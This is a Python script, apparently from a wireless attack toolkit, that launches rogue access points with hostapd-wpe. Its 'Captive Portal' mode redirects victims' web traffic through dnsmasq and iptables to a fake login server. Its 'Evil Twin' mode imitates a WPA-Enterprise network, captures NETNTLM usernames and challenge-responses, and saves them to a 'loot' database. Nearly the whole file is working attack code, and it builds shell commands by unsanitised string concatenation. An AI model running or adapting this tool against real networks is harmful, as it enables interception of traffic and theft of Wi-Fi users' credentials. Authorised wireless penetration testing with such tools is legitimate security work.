#!/usr/bin/python
import argparse
from argparse import ArgumentParser, SUPPRESS, ArgumentError
import subprocess
import sys, time
sys.path.insert(0, 'lib/')
from Queries import *
import os

parser = argparse.ArgumentParser(usage=SUPPRESS)
parser.add_argument('-i', '--interface', metavar='Interface', dest='interface', action='store', help='Interface to use\n', required=True)
parser.add_argument('-s', '--ssid', metavar='SSID', dest='ssid', action='store', help=argparse.SUPPRESS, required=True)
parser.add_argument('-c', '--channel', metavar='channel', dest='channel', action='store', help='Channel\n', required=True)
parser.add_argument('-w', '--wpa', metavar='wpa', dest='wpa', action='store', help='WPA version type\n', required=False)
parser.add_argument('-a', '--attack', metavar='attack', dest='attack', action='store', help='Attack Type\n', required=True)
#parser.add_argument('-t', '--template', metavar='template', dest='template', action='store', help='Template\n', required=True)
parser.add_argument('-d', '--database', metavar='database', dest='database', action='store', help='Database name\n', required=True)

args = parser.parse_args()


def main():
	attack = args.attack
	ssid = args.ssid
	channel = args.channel
	interface = args.interface
	wpa = args.wpa
	#template= args.template
	workspace = args.database

	path = "module/hostapd/hostapd/"		
	

	if attack in ["Captive Portal"]:
		CHANNEL = ("channel="+channel+"\n")
		SSID = ("ssid="+ssid+"\n")
		IFACE = ("interface="+interface+"\n")
		auth = ("driver=nl80211\n"
			"hw_mode=g\n"
			"wmm_enabled=1\n"
			"ctrl_interface=/var/run/hostapd\n"
				)


		dns = (
			   "interface="+interface+"\n"
			   "dhcp-range="+interface+",10.20.0.2,10.20.0.254,12h\n"
			   "log-facility = module/Captive_Portal/dns.log\n"
			   "log-dhcp\n"
			   )

		dhcp = ("iface wlan0 inet static\n"
  				"address 10.0.0.1\n"
  				"netmask 255.255.255.0\n")

		outfile = open('module/Captive_Portal/dnsmasq.conf', 'w')
		outfile.write(dns)
		outfile.close()

		subprocess.call('nmcli radio wifi off', shell=True)
		subprocess.call('rfkill unblock wlan', shell=True)
		subprocess.call('ifconfig '+interface+' down', shell=True)
		subprocess.call('ifconfig '+interface+' up', shell=True)
		subprocess.call('ifconfig '+interface+' 10.20.0.1 netmask 255.255.255.0', shell=True)

		subprocess.call('iptables -N internet -t mangle', shell=True)
		subprocess.call('iptables -t mangle -A PREROUTING -j internet', shell=True)
		subprocess.call('iptables -t mangle -A internet -j MARK --set-mark 99', shell=True)
		subprocess.call('iptables -t nat -A PREROUTING -m mark --mark 99 -p tcp --dport 80 -j DNAT --to-destination 10.20.0.1', shell=True)
		subprocess.call('echo "1" > /proc/sys/net/ipv4/ip_forward', shell=True)
		subprocess.call('iptables -A FORWARD -i eth0 -o wlan0 -m state --state ESTABLISHED,RELATED -j ACCEPT', shell=True)
		subprocess.call('iptables -A FORWARD -m mark --mark 99 -j REJECT', shell=True)
		subprocess.call('iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT', shell=True)
		subprocess.call('iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE', shell=True)
		file = auth + SSID + CHANNEL + IFACE
		outfile = open(''+path+'hostapd-wpe.conf', 'w')
		outfile.write(file)
		outfile.close()



	if attack in ["Evil Twin"]:

		auth = ("wpa_key_mgmt=WPA-EAP\n"
					"wpa_pairwise=TKIP CCMP\n"
					)
		WPA = ("wpa="+wpa+"\n"
			"wpa_pairwise=TKIP CCMP\n"
				)

		CHANNEL = ("channel="+channel+"\n")
		SSID = ("ssid="+ssid+"\n")
		IFACE = ("interface="+interface+"\n")


		hostapd =(
			"# Module bitfield: -1 = all\n"
			"logger_syslog=4\n"
			"# Levels: 0 (verbose debug), 1 (debug), 2 (info), 3 (notify), 4 (warning)\n"
			"logger_syslog_level=4\n"
			"# Module bitfield: -1 = all\n"
			"logger_stdout=4\n"
			"# Levels: 0 (verbose debug), 1 (debug), 2 (info), 3 (notify), 4 (warning)\n"
			"logger_stdout_level=4\n"
			"eap_user_file="+path+"hostapd-wpe.eap_user\n"
			"ca_cert="+path+"../../hostapd-wpe/certs/ca.pem\n"
			"server_cert="+path+"../../hostapd-wpe/certs/server.pem\n"
			"private_key="+path+"../../hostapd-wpe/certs/server.pem\n"
			"private_key_passwd=whatever\n"
			"dh_file="+path+"../../hostapd-wpe/certs/dh\n"
			"own_ip_addr=127.0.0.1\n"
			"eap_server=1\n"
			"eap_fast_a_id=101112131415161718191a1b1c1d1e1f\n"
			"eap_fast_a_id_info=hostapd-wpe\n"
			"eap_fast_prov=3\n"
			"ieee8021x=1\n"
			"pac_key_lifetime=604800\n"
			"pac_key_refresh_time=86400\n"
			"pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f\n"
			"hw_mode=b\n"
			"wpe_logfile=module/loot.log\n"
			)

		file = hostapd + auth + SSID + CHANNEL + IFACE + WPA
		outfile = open(''+path+'hostapd-wpe.conf', 'w')
		outfile.write(file)
		outfile.close()

		subprocess.call('nmcli radio wifi off', shell=True)
		subprocess.call('rfkill unblock wlan', shell=True)
		subprocess.call('ifconfig '+interface+' down', shell=True)
		subprocess.call('iwconfig '+interface+' mode managed', shell=True)
		subprocess.call('ifconfig '+interface+' up', shell=True)
		subprocess.call('ifconfig '+interface+' 10.20.0.1 netmask 255.255.255.0', shell=True)

	if attack in ["Captive Portal"]:
		subprocess.call('tmux -2 new-session -d -s exploit', shell=True)
		subprocess.call('tmux split-window -h', shell=True)
		subprocess.call('tmux select-pane -t 0', shell=True)
		print "Setting up Hostapd configuration"
		subprocess.call('tmux send-keys \"'+path+'hostapd-wpe '+path+'hostapd-wpe.conf\" C-m', shell=True)
		time.sleep(10)
		print "Setting up DNS"
		subprocess.call('tmux select-pane -t 1', shell=True)
		subprocess.call('tmux send-keys \"dnsmasq -d -C module/Captive_Portal/dnsmasq.conf\" C-m', shell=True)
		print "Launching web server"
		try:
			subprocess.call('cd module/Captive_Portal/cisco/ && python ../server.py '+workspace+'', shell=True)
		except KeyboardInterrupt:
			subprocess.call('killall hostapd-wpe', shell=True)
			subprocess.call('killall dnsmasq', shell=True)
			subprocess.call('tmux kill-session -t exploit', shell=True)
			subprocess.call('iptables -F', shell=True)
			subprocess.call('iptables -X', shell=True)
			subprocess.call('iptables -t nat -F', shell=True)
			subprocess.call('iptables -t nat -X', shell=True)
			subprocess.call('iptables -t mangle -F', shell=True)
			subprocess.call('iptables -t mangle -X', shell=True)
			pass
	elif attack in ["Evil Twin"]:
		subprocess.call('touch module/loot.log', shell=True)
		os.system(''+path+'hostapd-wpe '+path+'hostapd-wpe.conf')
		with open('module/loot.log') as f:
		  for line in f:
		    if 'NETNTLM:' in line:
				line = line.replace('      jtr NETNTLM:   ','')
				line = line.replace('\n','')
				line = line.split(':')
				loot = {'MAC': '','Password': '','Username': ''}
				loot.update(MAC = "N/A") 
				loot.update(Password = line[2])
				loot.update(Username = line[1])
				d = queries()
				d.db_connect(workspace)
				d.loot(loot)
		subprocess.call('rm -rf module/loot.log', shell=True)
	else:
		pass
	return
	





main()
